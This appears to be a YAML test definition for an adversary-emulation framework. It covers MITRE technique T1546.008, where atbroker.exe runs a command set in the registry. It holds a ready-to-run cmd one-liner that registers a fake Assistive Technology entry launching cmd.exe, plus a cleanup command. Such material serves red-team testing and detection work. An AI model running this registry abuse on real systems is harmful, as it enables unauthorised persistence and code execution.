- requirements: []
  name: Soumaia ART Tests - Atbroker.exe (AT) Executes Arbitrary Command via Registry Key
  description: Executes code specified in the registry for a new AT (Assistive Technologies). (requires elevation)
  tactic: privilege-escalation
  technique_id: T1546.008
  technique_name: 'Event Triggered Execution: Accessibility Features'
  executors:
  - cleanup:
    - reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
    timeout: 60
    platform: windows
    name: cmd
    payloads: []
    parsers: []
    command: reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f & reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f & reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f & atbroker /start malware_test
  id: 6bb61ca6-4a4b-5441-a53b-18f524f299db
